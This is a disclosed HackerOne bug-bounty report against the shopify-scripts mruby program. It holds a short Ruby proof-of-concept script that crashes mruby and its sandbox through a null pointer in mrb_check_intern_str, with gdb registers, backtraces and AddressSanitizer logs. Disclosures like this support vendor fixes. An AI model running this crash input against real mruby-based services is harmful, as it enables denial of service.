{"id":193075,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTMwNzU=","url":"https://hackerone.com/reports/193075","title":"SIGSEGV - mrb_check_intern_str() - NullPointer","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2016-12-21T14:23:30.522Z","submitted_at":"2016-12-21T14:23:30.522Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ston3","url":"/ston3","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-03-01T21:34:23.821Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-01-30T21:34:15.148Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"PoC\n---------------------\n\nThe following code triggers the bug (attached as mrb_vm_exec.rb):\n\n\tdef to_str\n\t$s.replace(\"\")end\n\t$s=\"\"\n\tclass Test00espondTo end\n\tTest00espondTo.respond_to?(0)\n\nCrash - mirb\n---------------------\n\n\tx@x:~/Desktop/research/mruby/bin$ ./mirb mrb_check_intern_str.rb \n\tmirb - Embeddable Interactive Ruby Shell\n\n\t =\u003e :to_str\n\t =\u003e \"\"\n\t =\u003e nil\n\tSegmentation fault (core dumped)\n\n\nDebug - mirb\n---------------------\n\n\tx@x:~/Desktop/research/mruby/bin$ gdb -q ./mirb\n\tReading symbols from ./mirb...done.\n\t(gdb) r mrb_check_intern_str.rb \n\tStarting program: /home/x/Desktop/research/mruby/bin/mirb mrb_check_intern_str.rb\n\tmirb - Embeddable Interactive Ruby Shell\n\n\t =\u003e :to_str\n\t =\u003e \"\"\n\t =\u003e nil\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\tmrb_check_intern_str (mrb=0x756010, str=\u003cerror reading variable: access outside bounds of object referenced via synthetic pointer\u003e) at /home/x/Desktop/research/mruby/src/symbol.c:143\n\t143\t  return mrb_check_intern(mrb, RSTRING_PTR(str), RSTRING_LEN(str));\n\t(gdb) info reg\n\trax            0x3015\t12309\n\trbx            0x756010\t7692304\n\trcx            0x745350\t7623504\n\trdx            0x3\t3\n\trsi            0x0\t0\n\trdi            0x756010\t7692304\n\trbp            0xfffffffffffffffc\t0xfffffffffffffffc\n\trsp            0x7fffffffc5c0\t0x7fffffffc5c0\n\tr8             0x1\t1\n\tr9             0x0\t0\n\tr10            0x0\t0\n\tr11            0x8000044000000000\t-9223367363930357760\n\tr12            0xfffffffffffffffc\t-4\n\tr13            0x0\t0\n\tr14            0x756010\t7692304\n\tr15            0x759090\t7704720\n\trip            0x42a540\t0x42a540 \u003cmrb_check_intern_str+48\u003e\n\teflags         0x10202\t[ IF RF ]\n\tcs             0x33\t51\n\tss             0x2b\t43\n\tds             0x0\t0\n\tes             0x0\t0\n\tfs             0x0\t0\n\tgs             0x0\t0\n\nBacktrace - mirb\n---------------------\n\n\t(gdb) bt\n\t#0  mrb_check_intern_str (mrb=0x756010, str=\u003cerror reading variable: access outside bounds of object referenced via synthetic pointer\u003e) at /home/x/Desktop/research/mruby/src/symbol.c:143\n\t#1  0x0000000000427fc9 in obj_respond_to (mrb=0x756010, self=\u003cerror reading variable: access outside bounds of object referenced via synthetic pointer\u003e) at /home/x/Desktop/research/mruby/src/kernel.c:961\n\t#2  0x000000000040a37d in mrb_vm_exec (mrb=\u003coptimized out\u003e, proc=0x0, pc=\u003coptimized out\u003e) at /home/x/Desktop/research/mruby/src/vm.c:1171\n\t#3  0x0000000000402e68 in main (argc=\u003coptimized out\u003e, argv=\u003coptimized out\u003e) at /home/x/Desktop/research/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n\nClang - mirb\n---------------------\n\n\tx@x:~/Desktop/research/clang/mruby/bin$ ./mirb mrb_check_intern_str.rb \n\tmirb - Embeddable Interactive Ruby Shell\n\n\t =\u003e :to_str\n\t =\u003e \"\"\n\t =\u003e nil\n\tASAN:DEADLYSIGNAL\n\t=================================================================\n\t==5111==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x000000577626 bp 0x7fff9e888950 sp 0x7fff9e888780 T0)\n\t    #0 0x577625  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x577625)\n\t    #1 0x56cfff  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x56cfff)\n\t    #2 0x50b14c  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x50b14c)\n\t    #3 0x501d5b  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x501d5b)\n\t    #4 0x4f3ef8  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x4f3ef8)\n\t    #5 0x7f409fd19ec4  (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)\n\t    #6 0x41a595  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x41a595)\n\n\tAddressSanitizer can not provide additional info.\n\tSUMMARY: AddressSanitizer: SEGV (/home/x/Desktop/research/clang/mruby/bin/mirb+0x577625) \n\t==5111==ABORTING\n\nCrash - mruby\n---------------------\n\n\tx@x:~/Desktop/research/mruby/bin$ ./mruby mrb_check_intern_str.rb \n\tSegmentation fault (core dumped)\n\nDebug - mruby\n---------------------\n\n\tx@x:~/Desktop/research/mruby/bin$ gdb -q ./mruby\n\tReading symbols from ./mruby...done.\n\t(gdb) r mrb_check_intern_str.rb \n\tStarting program: /home/x/Desktop/research/mruby/bin/mruby mrb_check_intern_str.rb\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\tmrb_check_intern_str (mrb=0x755010, str=\u003cerror reading variable: access outside bounds of object referenced via synthetic pointer\u003e) at /home/x/Desktop/research/mruby/src/symbol.c:143\n\t143\t  return mrb_check_intern(mrb, RSTRING_PTR(str), RSTRING_LEN(str));\n\t(gdb) info reg\n\trax            0x3015\t12309\n\trbx            0x755010\t7688208\n\trcx            0x744330\t7619376\n\trdx            0x3\t3\n\trsi            0x0\t0\n\trdi            0x755010\t7688208\n\trbp            0xfffffffffffffffc\t0xfffffffffffffffc\n\trsp            0x7fffffffd740\t0x7fffffffd740\n\tr8             0x1\t1\n\tr9             0x0\t0\n\tr10            0x0\t0\n\tr11            0x8000044000000000\t-9223367363930357760\n\tr12            0xfffffffffffffffc\t-4\n\tr13            0x0\t0\n\tr14            0x755010\t7688208\n\tr15            0x758120\t7700768\n\trip            0x412e20\t0x412e20 \u003cmrb_check_intern_str+48\u003e\n\teflags         0x10202\t[ IF RF ]\n\tcs             0x33\t51\n\tss             0x2b\t43\n\tds             0x0\t0\n\tes             0x0\t0\n\tfs             0x0\t0\n\tgs             0x0\t0\n\nBacktrace - mruby\n---------------------\n\n\t(gdb) bt\n\t#0  mrb_check_intern_str (mrb=0x755010, str=\u003cerror reading variable: access outside bounds of object referenced via synthetic pointer\u003e) at /home/x/Desktop/research/mruby/src/symbol.c:143\n\t#1  0x00000000004c95d9 in obj_respond_to (mrb=0x755010, self=\u003cerror reading variable: access outside bounds of object referenced via synthetic pointer\u003e) at /home/x/Desktop/research/mruby/src/kernel.c:961\n\t#2  0x00000000004b842d in mrb_vm_exec (mrb=\u003coptimized out\u003e, proc=0x0, pc=\u003coptimized out\u003e) at /home/x/Desktop/research/mruby/src/vm.c:1171\n\t#3  0x00000000004c1ecd in mrb_vm_run (proc=0x7581b0, self=..., stack_keep=1, mrb=\u003coptimized out\u003e) at /home/x/Desktop/research/mruby/src/vm.c:772\n\t#4  mrb_top_run (mrb=0x755010, proc=0x7581b0, self=..., stack_keep=\u003coptimized out\u003e) at /home/x/Desktop/research/mruby/src/vm.c:2487\n\t#5  0x000000000049472f in mrb_load_exec (mrb=0x755010, p=\u003coptimized out\u003e, c=0x7aff30) at /home/x/Desktop/research/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n\t#6  0x0000000000402c67 in main (argc=\u003coptimized out\u003e, argv=\u003coptimized out\u003e) at /home/x/Desktop/research/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n\nClang - mruby\n---------------------\n\n\tx@x:~/Desktop/research/clang/mruby/bin$ ./mruby mrb_check_intern_str.rb \n\tASAN:DEADLYSIGNAL\n\t=================================================================\n\t==5116==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00000051c826 bp 0x7fffd99d7790 sp 0x7fffd99d75c0 T0)\n\t    #0 0x51c825  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x51c825)\n\t    #1 0x69997f  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x69997f)\n\t    #2 0x65470c  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x65470c)\n\t    #3 0x64b31b  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x64b31b)\n\t    #4 0x6773e8  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x6773e8)\n\t    #5 0x616529  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x616529)\n\t    #6 0x6171c5  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x6171c5)\n\t    #7 0x4f3af5  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x4f3af5)\n\t    #8 0x7fa8d20caec4  (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)\n\t    #9 0x41a505  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x41a505)\n\n\tAddressSanitizer can not provide additional info.\n\tSUMMARY: AddressSanitizer: SEGV (/home/x/Desktop/research/clang/mruby/bin/mruby+0x51c825) \n\t==5116==ABORTING\n\nSandbox - Crash\n---------------------\nAttached as sandbox.log\n\n\t\tx@x:~/Desktop/research/mruby/bin$ ../../mruby-engine/bin/sandbox mrb_check_intern_str.rb \n\t../../mruby-engine/bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000001\n\truby 2.2.6p396 (2016-11-15 revision 56800) [x86_64-linux-gnu]\n\n\t-- Control frame information -----------------------------------------------\n\tc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\n\tc:0002 p:0186 s:0005 E:001058 EVAL   ../../mruby-engine/bin/sandbox:20 [FINISH]\n\tc:0001 p:0000 s:0002 E:001f30 TOP    [FINISH]\n\n\t-- Ruby level backtrace information ----------------------------------------\n\t../../mruby-engine/bin/sandbox:20:in `\u003cmain\u003e'\n\t../../mruby-engine/bin/sandbox:20:in `sandbox_eval'\n\n\t-- Machine register context ------------------------------------------------\n\t RIP: 0x00007f7ff452d994 RBP: 0x00007f7ff30ac040 RSP: 0x00007f7ff30a2980\n\t RAX: 0x00007f7ff30ac070 RBX: 0x00007f7ff30a44e0 RCX: 0x0000000000000005\n\t RDX: 0x0000000000000010 RDI: 0x00007f7ff30a44e0 RSI: 0x0000000000000001\n\t  R8: 0x00007f7ff30a43e0  R9: 0x0000000000000001 R10: 0x00007f7ff30a44e0\n\t R11: 0x0000000000000000 R12: 0x00007f7ff30af2b0 R13: 0x00007f7ff30b0a00\n\t R14: 0x0000000000000001 R15: 0x00007f7ff30a44e0 EFL: 0x0000000000010202\n\n\t-- C level backtrace information -------------------------------------------\n\t/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f7ff8c1fd55]\n\t/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f7ff8c1ff8c]\n\t/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f7ff8afc06b]\n\t/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f7ff8bb214e]\n\t...\n\t...\n\t...\n\t7f7ff912c000-7f7ff912d000 r--p 00022000 08:01 1839103                    /lib/x86_64-linux-gnu/ld-2.19.so\n\t7f7ff912d000-7f7ff912e000 rw-p 00023000 08:01 1839103                    /lib/x86_64-linux-gnu/ld-2.19.so\n\t7f7ff912e000-7f7ff912f000 rw-p 00000000 00:00 0 \n\t7ffffc1c6000-7ffffc9c5000 rw-p 00000000 00:00 0                          [stack]\n\t7ffffc9fe000-7ffffca00000 r-xp 00000000 00:00 0                          [vdso]\n\tffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n\n\n\t[NOTE]\n\tYou may have encountered a bug in the Ruby interpreter or extension libraries.\n\tBug reports are welcome.\n\tFor details: http://www.ruby-lang.org/bugreport.html\n\n\tAborted (core dumped)\n\nImpact\n---------------------\n\nThis vulnerability is caused by NullPointer error. It can not be exploited, but it can cause DoS.","vulnerability_information_html":"\u003ch2 id=\"poc\"\u003ePoC\u003c/h2\u003e\n\n\u003cp\u003eThe following code triggers the bug (attached as mrb_vm_exec.rb):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003edef to_str\n$s.replace(\u0026quot;\u0026quot;)end\n$s=\u0026quot;\u0026quot;\nclass Test00espondTo end\nTest00espondTo.respond_to?(0)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"crash-mirb\"\u003eCrash - mirb\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/research/mruby/bin$ ./mirb mrb_check_intern_str.rb \nmirb - Embeddable Interactive Ruby Shell\n\n =\u0026gt; :to_str\n =\u0026gt; \u0026quot;\u0026quot;\n =\u0026gt; nil\nSegmentation fault (core dumped)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"debug-mirb\"\u003eDebug - mirb\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/research/mruby/bin$ gdb -q ./mirb\nReading symbols from ./mirb...done.\n(gdb) r mrb_check_intern_str.rb \nStarting program: /home/x/Desktop/research/mruby/bin/mirb mrb_check_intern_str.rb\nmirb - Embeddable Interactive Ruby Shell\n\n =\u0026gt; :to_str\n =\u0026gt; \u0026quot;\u0026quot;\n =\u0026gt; nil\n\nProgram received signal SIGSEGV, Segmentation fault.\nmrb_check_intern_str (mrb=0x756010, str=\u0026lt;error reading variable: access outside bounds of object referenced via synthetic pointer\u0026gt;) at /home/x/Desktop/research/mruby/src/symbol.c:143\n143   return mrb_check_intern(mrb, RSTRING_PTR(str), RSTRING_LEN(str));\n(gdb) info reg\nrax            0x3015   12309\nrbx            0x756010 7692304\nrcx            0x745350 7623504\nrdx            0x3  3\nrsi            0x0  0\nrdi            0x756010 7692304\nrbp            0xfffffffffffffffc   0xfffffffffffffffc\nrsp            0x7fffffffc5c0   0x7fffffffc5c0\nr8             0x1  1\nr9             0x0  0\nr10            0x0  0\nr11            0x8000044000000000   -9223367363930357760\nr12            0xfffffffffffffffc   -4\nr13            0x0  0\nr14            0x756010 7692304\nr15            0x759090 7704720\nrip            0x42a540 0x42a540 \u0026lt;mrb_check_intern_str+48\u0026gt;\neflags         0x10202  [ IF RF ]\ncs             0x33 51\nss             0x2b 43\nds             0x0  0\nes             0x0  0\nfs             0x0  0\ngs             0x0  0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"backtrace-mirb\"\u003eBacktrace - mirb\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) bt\n#0  mrb_check_intern_str (mrb=0x756010, str=\u0026lt;error reading variable: access outside bounds of object referenced via synthetic pointer\u0026gt;) at /home/x/Desktop/research/mruby/src/symbol.c:143\n#1  0x0000000000427fc9 in obj_respond_to (mrb=0x756010, self=\u0026lt;error reading variable: access outside bounds of object referenced via synthetic pointer\u0026gt;) at /home/x/Desktop/research/mruby/src/kernel.c:961\n#2  0x000000000040a37d in mrb_vm_exec (mrb=\u0026lt;optimized out\u0026gt;, proc=0x0, pc=\u0026lt;optimized out\u0026gt;) at /home/x/Desktop/research/mruby/src/vm.c:1171\n#3  0x0000000000402e68 in main (argc=\u0026lt;optimized out\u0026gt;, argv=\u0026lt;optimized out\u0026gt;) at /home/x/Desktop/research/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"clang-mirb\"\u003eClang - mirb\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/research/clang/mruby/bin$ ./mirb mrb_check_intern_str.rb \nmirb - Embeddable Interactive Ruby Shell\n\n =\u0026gt; :to_str\n =\u0026gt; \u0026quot;\u0026quot;\n =\u0026gt; nil\nASAN:DEADLYSIGNAL\n=================================================================\n==5111==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x000000577626 bp 0x7fff9e888950 sp 0x7fff9e888780 T0)\n    #0 0x577625  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x577625)\n    #1 0x56cfff  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x56cfff)\n    #2 0x50b14c  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x50b14c)\n    #3 0x501d5b  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x501d5b)\n    #4 0x4f3ef8  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x4f3ef8)\n    #5 0x7f409fd19ec4  (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)\n    #6 0x41a595  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x41a595)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV (/home/x/Desktop/research/clang/mruby/bin/mirb+0x577625) \n==5111==ABORTING\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"crash-mruby\"\u003eCrash - mruby\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/research/mruby/bin$ ./mruby mrb_check_intern_str.rb \nSegmentation fault (core dumped)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"debug-mruby\"\u003eDebug - mruby\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/research/mruby/bin$ gdb -q ./mruby\nReading symbols from ./mruby...done.\n(gdb) r mrb_check_intern_str.rb \nStarting program: /home/x/Desktop/research/mruby/bin/mruby mrb_check_intern_str.rb\n\nProgram received signal SIGSEGV, Segmentation fault.\nmrb_check_intern_str (mrb=0x755010, str=\u0026lt;error reading variable: access outside bounds of object referenced via synthetic pointer\u0026gt;) at /home/x/Desktop/research/mruby/src/symbol.c:143\n143   return mrb_check_intern(mrb, RSTRING_PTR(str), RSTRING_LEN(str));\n(gdb) info reg\nrax            0x3015   12309\nrbx            0x755010 7688208\nrcx            0x744330 7619376\nrdx            0x3  3\nrsi            0x0  0\nrdi            0x755010 7688208\nrbp            0xfffffffffffffffc   0xfffffffffffffffc\nrsp            0x7fffffffd740   0x7fffffffd740\nr8             0x1  1\nr9             0x0  0\nr10            0x0  0\nr11            0x8000044000000000   -9223367363930357760\nr12            0xfffffffffffffffc   -4\nr13            0x0  0\nr14            0x755010 7688208\nr15            0x758120 7700768\nrip            0x412e20 0x412e20 \u0026lt;mrb_check_intern_str+48\u0026gt;\neflags         0x10202  [ IF RF ]\ncs             0x33 51\nss             0x2b 43\nds             0x0  0\nes             0x0  0\nfs             0x0  0\ngs             0x0  0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"backtrace-mruby\"\u003eBacktrace - mruby\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) bt\n#0  mrb_check_intern_str (mrb=0x755010, str=\u0026lt;error reading variable: access outside bounds of object referenced via synthetic pointer\u0026gt;) at /home/x/Desktop/research/mruby/src/symbol.c:143\n#1  0x00000000004c95d9 in obj_respond_to (mrb=0x755010, self=\u0026lt;error reading variable: access outside bounds of object referenced via synthetic pointer\u0026gt;) at /home/x/Desktop/research/mruby/src/kernel.c:961\n#2  0x00000000004b842d in mrb_vm_exec (mrb=\u0026lt;optimized out\u0026gt;, proc=0x0, pc=\u0026lt;optimized out\u0026gt;) at /home/x/Desktop/research/mruby/src/vm.c:1171\n#3  0x00000000004c1ecd in mrb_vm_run (proc=0x7581b0, self=..., stack_keep=1, mrb=\u0026lt;optimized out\u0026gt;) at /home/x/Desktop/research/mruby/src/vm.c:772\n#4  mrb_top_run (mrb=0x755010, proc=0x7581b0, self=..., stack_keep=\u0026lt;optimized out\u0026gt;) at /home/x/Desktop/research/mruby/src/vm.c:2487\n#5  0x000000000049472f in mrb_load_exec (mrb=0x755010, p=\u0026lt;optimized out\u0026gt;, c=0x7aff30) at /home/x/Desktop/research/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n#6  0x0000000000402c67 in main (argc=\u0026lt;optimized out\u0026gt;, argv=\u0026lt;optimized out\u0026gt;) at /home/x/Desktop/research/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"clang-mruby\"\u003eClang - mruby\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/research/clang/mruby/bin$ ./mruby mrb_check_intern_str.rb \nASAN:DEADLYSIGNAL\n=================================================================\n==5116==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00000051c826 bp 0x7fffd99d7790 sp 0x7fffd99d75c0 T0)\n    #0 0x51c825  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x51c825)\n    #1 0x69997f  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x69997f)\n    #2 0x65470c  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x65470c)\n    #3 0x64b31b  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x64b31b)\n    #4 0x6773e8  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x6773e8)\n    #5 0x616529  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x616529)\n    #6 0x6171c5  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x6171c5)\n    #7 0x4f3af5  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x4f3af5)\n    #8 0x7fa8d20caec4  (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)\n    #9 0x41a505  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x41a505)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV (/home/x/Desktop/research/clang/mruby/bin/mruby+0x51c825) \n==5116==ABORTING\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"sandbox-crash\"\u003eSandbox - Crash\u003c/h2\u003e\n\n\u003cp\u003eAttached as sandbox.log\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    x@x:~/Desktop/research/mruby/bin$ ../../mruby-engine/bin/sandbox mrb_check_intern_str.rb \n../../mruby-engine/bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000001\nruby 2.2.6p396 (2016-11-15 revision 56800) [x86_64-linux-gnu]\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\nc:0002 p:0186 s:0005 E:001058 EVAL   ../../mruby-engine/bin/sandbox:20 [FINISH]\nc:0001 p:0000 s:0002 E:001f30 TOP    [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\n../../mruby-engine/bin/sandbox:20:in `\u0026lt;main\u0026gt;\u0026#39;\n../../mruby-engine/bin/sandbox:20:in `sandbox_eval\u0026#39;\n\n-- Machine register context ------------------------------------------------\n RIP: 0x00007f7ff452d994 RBP: 0x00007f7ff30ac040 RSP: 0x00007f7ff30a2980\n RAX: 0x00007f7ff30ac070 RBX: 0x00007f7ff30a44e0 RCX: 0x0000000000000005\n RDX: 0x0000000000000010 RDI: 0x00007f7ff30a44e0 RSI: 0x0000000000000001\n  R8: 0x00007f7ff30a43e0  R9: 0x0000000000000001 R10: 0x00007f7ff30a44e0\n R11: 0x0000000000000000 R12: 0x00007f7ff30af2b0 R13: 0x00007f7ff30b0a00\n R14: 0x0000000000000001 R15: 0x00007f7ff30a44e0 EFL: 0x0000000000010202\n\n-- C level backtrace information -------------------------------------------\n/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f7ff8c1fd55]\n/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f7ff8c1ff8c]\n/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f7ff8afc06b]\n/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f7ff8bb214e]\n...\n...\n...\n7f7ff912c000-7f7ff912d000 r--p 00022000 08:01 1839103                    /lib/x86_64-linux-gnu/ld-2.19.so\n7f7ff912d000-7f7ff912e000 rw-p 00023000 08:01 1839103                    /lib/x86_64-linux-gnu/ld-2.19.so\n7f7ff912e000-7f7ff912f000 rw-p 00000000 00:00 0 \n7ffffc1c6000-7ffffc9c5000 rw-p 00000000 00:00 0                          [stack]\n7ffffc9fe000-7ffffca00000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n\n\n[NOTE]\nYou may have encountered a bug in the Ruby interpreter or extension libraries.\nBug reports are welcome.\nFor details: http://www.ruby-lang.org/bugreport.html\n\nAborted (core dumped)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThis vulnerability is caused by NullPointer error. It can not be exploited, but it can cause DoS.\u003c/p\u003e\n","bounty_amount":"800.0","formatted_bounty":"$800","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":145829,"file_name":"mrb_check_intern_str.rb","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/145/829/c3c160b531261f48fc194145c2b82f3f6305d343/mrb_check_intern_str.rb?response-content-disposition=attachment%3B%20filename%3D%22mrb_check_intern_str.rb%22%3B%20filename%2A%3DUTF-8%27%27mrb_check_intern_str.rb\u0026response-content-type=text%2Fx-c%2B%2B\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVN4C5GIR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045018Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICjdrX7ABZ%2BvfX76vY4hAT36HAFa7ABTRFnFNWlME3RsAiA6spUqHGGbpGIJMpDYYPRLrN21uLj3JvPgDLV04KLXWCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIM%2BwbYtZgzO0HRNuilKpED0QRzghA3dQ82LDNvNHg%2F%2Bapjkbzzquj0OQyaslf6lhZ6ae5aaEALaU1htc90%2FTkEnCjK7YAB%2BOOqYauHnXFwgnicH8P2qB1b6qq8ByPdiyv%2F6FeKLaeKEKd1ked0wxhxGILfvv9geWvP9kPkCkrnpW%2Bk3I2nWFhXQ59oSwcUQzXUMoZ0agtptlqAo0vIB0BQ8w3QdM1eyZALy%2Fa2aEoAk0NEEkFhGgVq6y7NSlne0HYNYsnTubU1gtBiWgKFN75WWxAKzP41DZr9biaTv2LpKz%2BS54%2B0D7gM01Pv9DWNFSxduldCjFNWMHaz53TpINKZivByzZ%2FZritkdAHNoYR8NUHdDo4fG9KADtaMgItKYoCYS9dQ3VQKUnEB%2FG5XIqiEWJNuiVPw9Xo1zZJ7ItciKJ%2F2lZOYbSY5IWLtOLK3LAXfBln%2BqWM6KN%2BYSgAqj80OMMoKJozuCJRCLPgT%2BsuXVxgkfPMjWm0msUwRdOuNqAG3PPIFx7Qi20ur1fS33s63LIR24RY3pe1aeEm14DkixQAwqvyp%2FwU67AFUTZKxgkosuC9%2FFnLTDWAcFKkGbWeTSyQlX9WvARJtmEGSKKE3O3RCz4o1fvK2y8cIWG4ZDqIQnnY30DkA5lvQ1S96196eUcIlxUE3IU6WzlYzirsAJvCXzxdcKxl0gn59sA3vLFJkUTgoas7IMyJTtRG6%2B0%2BVBuYKCHqJR1eTwSQxZvS